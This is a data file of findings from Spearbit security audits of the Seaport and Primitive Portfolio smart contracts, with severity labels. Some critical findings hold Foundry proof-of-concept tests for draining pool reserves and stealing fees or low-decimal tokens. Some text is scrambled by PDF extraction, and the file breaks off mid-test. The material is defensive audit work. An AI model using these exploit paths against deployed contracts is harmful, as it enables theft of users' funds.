        "body": "There is a typo in _aggregateValidFulfillmentConsiderationItems: // Retrieve item index using an offset of the fulfillment pointer. let itemIndex := mload( add(mload(fulfillmentHeadPtr), Fulfillment_itemIndex_offset) ) // Ensure that the order index is not out of range. <---------- the line with typo if iszero(lt(itemIndex, mload(considerationArrPtr))) { throwInvalidFulfillmentComponentData() } The itemIndex above refers to the index in consideration array and not the order.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the unused parameters for orders of CONTRACT order type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "If an advance order advancedOrder is of CONTRACT order type, certain parameters are not being used in the code base, specifically:  numerator: only used for skipping certain operations (see AdvancedOrder.numerator and AdvancedOrder.denominator are unchecked for orders of CONTRACT order type)  denominator: --  signature: --  parameters.zone: only used when emitting the OrderFulfilled event.  parameters.offer.endAmount: endAmount and startAmount for offer items will be set to the amount sent back by generateOrder for the corresponding item.  parameters.consideration.endAmount: endAmount and startAmount for consideration items will be set to the amount sent back by generateOrder for the corresponding item  parameters.consideration.recipient: the offerer contract returns new recipients when generateOrder gets called  parameters.zoneHash: --  parameters.salt: --  parameters.totalOriginalConsiderationItems: --",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "The check against totalOriginalConsiderationItems is skipped for orders of CONTRACT order type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "compares dOrder.parameters.consideration.length: The AdvancedOrder.parameters.totalOriginalConsiderationItems inequality following skipped orders for of is CONTRACT order with type which Advance- // Ensure supplied consideration array length is not less than the original. if (suppliedConsiderationItemTotal < originalConsiderationItemTotal) { _revertMissingOriginalConsiderationItems(); }",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "getOrderStatus returns the default values for orderHash that is derived for orders of CONTRACT order type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Since the _orderStatus[orderHash] does not get set for orders of CONTRACT order type, getOrder- Status would always returns (false, false, 0, 0) for those hashes (unless there is a hash collision with other types of orders)",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "validate skips CONTRACT order types but cancel does not",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When validating orders validate skips any order of CONTRACT order type, but cancel does not skip these order types. When fulfilling or matching orders for CONTRACT order types, _orderStatus does not get checked or populated. But in cancel the isValidated and the isCancelled fields get set. This is basically a no-op for these order types.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "The literal 0x1c used as the starting offset of a custom error in a revert statement can be replaced by the named constant Error_selector_offset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the context above, 0x1c is used to signal the start of a custom error block saved in the memory: revert(0x1c, _LENGTH_) For the above literal, we also have a named constant defined in ConsiderationConstants.sol#L410: uint256 constant Error_selector_offset = 0x1c; The named constant Error_selector_offset has been used in most places that a custom error is reverted in an assembly block.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "tradingFunction returns wrong invariant at bounds, allowing to steal all pool reserves",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The tradingFunction computing the invariant value of k = (y/K) - (1-x) +  returns the wrong value at the bounds of x and y. The bounds of x are 0 and 1e18, the bounds of y are 0 and K, the strike price. If x or y is at these bounds, the corresponding term's computation is skipped and therefore implicitly set to 0, its initialization value. int256 invariantTermX; // (1-x) // @audit if x is at the bounds, the term remains 0 if (self.reserveXPerWad.isBetween(lowerBoundX + 1, upperBoundX - 1)) { invariantTermX = Gaussian.ppf(int256(WAD - self.reserveXPerWad)); } int256 invariantTermY; // (y/K) // @audit if y is at the bounds, the term remains 0 if (self.reserveYPerWad.isBetween(lowerBoundY + 1, upperBoundY - 1)) { invariantTermY = Gaussian.ppf( int256(self.reserveYPerWad.divWadUp(self.strikePriceWad)) ); } Note that  = Gaussian.ppf is the probit function which is undefined at 0 and 1.0, but tends towards -infinity at 0 and +infinity at 1.0 = 1e18. (The closest values used in the Solidity approximation are Gaussian.ppf(1) = -8710427241990476442 ~ -8.71 and Gaussian.ppf(1e18-1) = 8710427241990476442 ~ 8.71.) This fact can be abused by an attacker to steal the pool reserves. For example, the y-term (y/K) will be a negative value for y/K < 0.5. Trading out all y reserve, will compute the new invariant with y set to 0 and the y-term (y/K) = (0) = -infinity is set to 0 instead, increasing the overall invariant, accepting the swap. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"solmate/utils/SafeCastLib.sol\"; import \"./Setup.sol\"; contract TestSpearbit is Setup { using SafeCastLib for uint256; using AssemblyLib for uint256; using AssemblyLib for uint128; using FixedPointMathLib for uint256; using FixedPointMathLib for uint128; function test_swap_all_out() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { (uint256 reserveAsset, uint256 reserveQuote) = subject().getPoolReserves(ghost().poolId); bool sellAsset = true; uint128 amtIn = 2; // pass reserve-not-stale check after taking fee uint128 amtOut = uint128(reserveQuote); 4 uint256 prev = ghost().quote().to_token().balanceOf(actor()); Order memory order = Order({ useMax: false, poolId: ghost().poolId, input: amtIn, output: amtOut, sellAsset: sellAsset }); subject().swap(order); uint256 post = ghost().quote().to_token().balanceOf(actor()); assertTrue(post > prev, \"swap-failed\"); } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "getSpotPrice, approximateReservesGivenPrice, getStrategyData ignore time to maturity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "When calling getSpotPrice, getStrategyData or approximateReservesGivenPrice, the pool con- fig is transformed into a NormalCurve struct. This transformation always sets the time to maturity field to the entire duration 5 function transform(PortfolioConfig memory config) pure returns (NormalCurve memory) { return NormalCurve({ reserveXPerWad: 0, reserveYPerWad: 0, strikePriceWad: config.strikePriceWad, standardDeviationWad: config.volatilityBasisPoints.bpsToPercentWad(), timeRemainingSeconds: config.durationSeconds, invariant: 0 }); } Neither is the curve.timeRemainingSeconds value overridden with the correct value for the mentioned functions. The reported spot price will be wrong after the pool has been initialized and integrators cannot rely on this value.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Numerical error on larger trades favors the swapper relative to mathematically ideal pricing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "To test the accuracy of the Solidity numerical methods used, a Python implementation of the swap logic was created using a library that supports arbitrary precision (https://mpmath.org/). Solidity swap execu- tions generated in a custom fuzz test were compared against arbitrary precision results using Foundry's ffi feature (https://book.getfoundry.sh/forge/differential-ffi-testing). Cases where the \"realized\" swap price was better for the swapper than the \"ideal\" swap price were flagged. Deviations in the swapper's favor as large as 25% were observed (and larger ones likely exist). These seem to be a function of the size of the swap made--larger swaps favor the swapper more than smaller swaps (in fact, deviations were observed to trend towards zero as swap size relative to pool size decreased). It is unclear if there's any problem in practice from this behavior--large swaps will still incur large slippage and are only incentivized when the price has \"jumped\" drastically; fees also help make up for losses. Without going further, it can be stated that there is a risk for pools with frequent discontinuous price changes to track the theoretical payoff more poorly, but further numerical investigations are needed to determine whether there's a serious concern. The test cases below require the simulation repo to be cloned into a Python virtual environment in a directory named primitive-math-venv with the needed dependencies at the same directory hierarchy level as the port- folio repository. That is, the portfolio/ directory and primitive-math-venv/ directories should be in the same folder, and the primitive-math-venv/ folder should contain the primitive-sim repository. The virtual environ- ment needs to be activated and have the mpmath, scipy, numpy, and eth_abi dependencies installed via pip or another method. Alternatively, these can be installed globally in which case the primitive-math-venv directory does not need to be a virtual environment. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"solmate/utils/SafeCastLib.sol\"; import \"./Setup.sol\"; 6 contract TestNumericalDeviation is Setup { using SafeCastLib for uint256; using AssemblyLib for uint256; using AssemblyLib for uint128; using FixedPointMathLib for uint256; using FixedPointMathLib for uint128; bool printLogs = true; function _fuzz_random_args( bool sellAsset, uint256 amountIn, uint256 amountOut ) internal returns (bool swapExecuted) { Order memory maxOrder = subject().getMaxOrder(ghost().poolId, sellAsset, actor()); amountIn = bound(amountIn, maxOrder.input / 1000 + 1, maxOrder.input); amountOut = subject().getAmountOut(ghost().poolId, sellAsset, amountIn, actor()); if (printLogs) console.log(\"amountOut: \", amountOut); Order memory order = Order({ useMax: false, poolId: ghost().poolId, input: amountIn.safeCastTo128(), output: amountOut.safeCastTo128(), sellAsset: sellAsset }); try subject().simulateSwap({ order: order, timestamp: block.timestamp, swapper: actor() }) returns (bool swapSuccess, int256 prev, int256 post) { try subject().swap(order) { assertTrue( swapSuccess, \"simulateSwap-failed but swap succeeded\" ); assertTrue(post >= prev, \"post-invariant-not-gte-prev\"); swapExecuted = true; } catch { assertTrue( !swapSuccess, \"simulateSwap-succeeded but swap failed\" ); } } catch { // pass this case } } struct TestVals { uint256 strike; uint256 volatility_bps; uint256 durationSeconds; uint256 ttm; } // fuzzing entrypoint used to find violating swaps function test_swap_deviation(uint256 amtIn, uint256 amtOut) 7 public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); 8 cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalDependentPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalDependentPerL: \", idealFinalDependentPerL); uint256 postDependentPerL = sellAsset ? postYPerL : postXPerL; // Only worried if swap was _better_ than ideal if (idealFinalDependentPerL > postDependentPerL) { uint256 diff = idealFinalDependentPerL - postDependentPerL; uint256 percentErrWad = diff * 1e18 / idealFinalDependentPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 25% error assertLt(percentErrWad, 0.25 * 1e18); } } function test_swap_gt_2pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 6552423086988641261559668799172253742131420409793952225706522955; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); 9 if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 2% error assertLt(percentErrWad, 0.02 * 1e18); } } function test_swap_gt_5pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 524204019310836059902749478707356665714276202503631350973429403; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; 10 { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); 11 // assert at worst 2% error assertLt(percentErrWad, 0.05 * 1e18); } } function test_swap_gt_25pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 110109023928019935126448015360767432374367360662791991077231763772041488708545; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; 12 = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 25% error assertLt(percentErrWad, 0.25 * 1e18); } } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getMaxOrder overestimates output values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The getMaxOrder function adds + 1 to the output value, overestimating the output value. This can lead to failed swaps if this value is used. tempOutput = pool.virtualY - lowerY.mulWadDown(pool.liquidity) + 1; also easy It's erY.mulWadDown(pool.liquidity) + 1 = pool.virtualY + 1, more than the pool reserves. that with lowerY = 0 we see to have i.e., tempOutput = pool.virtualY - low- the max out amount would be",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Improve reentrancy guards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "Previously, only settlement performed calls to arbitrary addresses through ERC20 transfers. With recent additions, like the ERC1155._mint and user-provided strategies, single actions like allocate and swap also perform calls to potentially malicious contracts. This increases the attack surface for reentrancy attacks. The current way of protecting against reentrancy works by setting multicall flags (_currentMulticall) and locks (preLock() and postLock()) on multicalls and single-action calls. However, the single calls essentially skip reen- trancy guards if the outer context is a multicall. This still allows for reentrancy through control flows like the following: // reenter during multicall's action execution multicall preLock() singleCall() reenter during current execution singeCall() preLock(): passes because we're in multicall skips settlement postLock(): passes because we're in multicall _currentMulticall = false; settlement() postLock() // reenter during multicall's settlement multicall preLock() singleCall preLock(): ... postLock(): `_locked = 1` _currentMulticall = false; settlement() reenter singeCall() passes preLock because not locked mutliCall() passes multicall reentrancy guard because not in multicall passes preLock because not locked ... settlement finishes postLock()",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "approximatePriceGivenX does not need to compute y-bounds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The approximatePriceGivenX function does not need to compute the y-bounds by calling self.getReserveYBounds().",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary computations in NormalStrategy.beforeSwap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The NormalStrategy.sol.beforeSwap function calls getSwapInvariants to simulate an entire swap with current and post-swap invariants. However, only the current invariant value is used.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pools can use malicious strategies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "Anyone can create pools and configure the pool to use a custom strategy. A malicious strategy can disable swapping and (de-)allocating at any time, as well as enable privileged parties to trade out all pool reserves by implementing custom logic in the validateSwap function.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "findRootForSwappingIn functions should use MINIMUM_INVARIANT_DELTA",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The findRootForSwappingInX and findRootForSwappingInY functions add + 1 to the previous curve invariant tradingFunction(curve) - (curve.invariant + 1)",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused Errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The NormalStrategyLib_UpperPriceLimitReached and NormalStrategyLib_LowerPriceLim- itReached errors are not used.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "getSwapInvariants order output can be 1 instead of 2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The getSwapInvariants function is used to simulate swaps for the getAmountOut and beforeSwap functions. These functions use an artificial output value of 2 such that the function does not revert.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "AfterCreate event uses wrong durationSeconds value if pool is perpetual",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The AfterCreate uses the cached config.durationSeconds value but the real value the config storage struct is initialized with will be SECONDS_PER_YEAR in the case of perpetual pools.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary fee reserves check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The fee amount is always taken on the input and the fee percentage is always less than 100%. Therefore, the fee is always less than the input. The following check should never fail adjustedInputReserveWad += self.input; // feeAmountUnit <= self.input <= adjustedInputReserveWad if (feeAmountUnit > adjustedInputReserveWad) revert SwapLib_FeeTooHigh();",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Protocol fees are double-counted as registry balance and pool reserve",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "When swapping, the registry is credited a protocolFee. However, this fee is always reinvested in the pool, meaning the virtualX or virtualY pool reserves per liquidity increase by protocolFee / liquidity. The protocol fee is now double-counted as the registrys user balance and the pool reserve, while the global reserves are only increased by the protocol fee once in _increaseReserves(_state.tokenInput, iteration.input). A protocol fee breaks the invariant that the global reserve should be greater than the sum of user balances and fees plus the sum of pool reserves. As the protocol fee is reinvested, LPs can withdraw them. If users and LPs decide to withdraw all their balances, the registry cant withdraw their fees anymore. Conversely, if the registry withdraws the protocol fee, not all users can withdraw their balances anymore. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { function test_protocol_fee_reinvestment() public noJit defaultConfig useActor usePairTokens(100e18) allocateSome(10e18) // deltaLiquidity isArmed { // Set fee, 1/5 = 20% SimpleRegistry(subjects().registry).setFee(address(subject()), 5); // swap // make invariant go negative s.t. all fees are reinvested, not strictly necessary vm.warp(block.timestamp + 1 days); uint128 amtIn = 1e18; bool sellAsset = true; uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, ,! uint8(sellAsset ? 1 : 0))); // deallocate and earn reinvested LP fees + protocol fees, emptying _entire_ reserve including protocol fees ,! subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: false, useMax: uint8(1), poolId: ghost().poolId, deltaLiquidity: 0 // useMax will set this to freeLiquidity }) ); subject().draw(ghost().asset().to_addr(), type(uint256).max, actor()); uint256 protocol_fee = ghost().balance(subjects().registry, ghost().asset().to_addr()); 5 assertEq(protocol_fee, amtIn / 100 / 5); // 20% of 1% of 1e18 // the global reserve is 0 even though the protocol fee should still exist uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr()); assertEq(reserve_asset, 0); // reverts with InsufficientReserve(0, 2000000000000000) SimpleRegistry(subjects().registry).claimFee( address(subject()), ghost().asset().to_addr(), protocol_fee, address(this) ); } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "LP fees are in WAD instead of token decimal units",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "When swapping, deltaInput is in WAD (not token decimals) units. Therefore, feeAmount is also in WAD as a percentage of deltaInput. When calling _feeSavingEffects(args.poolId, iteration) to determine whether to reinvest the fees in the pool or earmark them for LPs, a _syncFeeGrowthAccumulator is done with the following parameter: _syncFeeGrowthAccumulator(FixedPointMathLib.divWadDown(iteration.feeAmount, iteration.liquidity)) This is a WAD per liquidity value stored in _state.feeGrowthGlobal and also in pool.feeGrowthGlobalAsset through a subsequent _syncPool call. If an LP claims now and their fees are synced with syncPositionFees, their tokensOwed is set to: uint256 differenceAsset = AssemblyLib.computeCheckpointDistance( feeGrowthAsset=pool.feeGrowthGlobalAsset, self.feeGrowthAssetLast ); feeAssetEarned = FixedPointMathLib.mulWadDown(differenceAsset, self.freeLiquidity); self.tokensOwedAsset += SafeCastLib.safeCastTo128(feeAssetEarned); Then tokensOwedAsset is increased by a WAD value (WAD per WAD liquidity multiplied by WAD liquidity) and they have credited this WAD value with _applyCredit(msg.sender, asset, claimedAssets) which they can then withdraw as a token decimal value. The result is that LP fees are credited and can be withdrawn as WAD units and tokens with fewer than 18 decimals can be stolen from the protocol. 6 // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { function test_fee_decimal_bug() public sixDecimalQuoteConfig useActor usePairTokens(31e18) allocateSome(100e18) // deltaLiquidity isArmed { // Understand current pool values. create pair initializes from price // DEFAULT_STRIKE=10e18 = 10.0 quote per asset = 1e7/1e18 = 1e-11 uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr()); uint256 reserve_quote = ghost().reserve(ghost().quote().to_addr()); assertEq(reserve_asset, 30.859596948332370800e18); assertEq(reserve_quote, 308.595965e6); // Do swap from quote -> asset, so we catch fee on quote bool sellAsset = false; // amtIn is in quote. gets scaled to WAD in `_swap`. uint128 amtIn = 100; // 0.0001$ ~ 1e14 iteration.input uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); { } // verify that before swap, we have no credit uint256 credited = 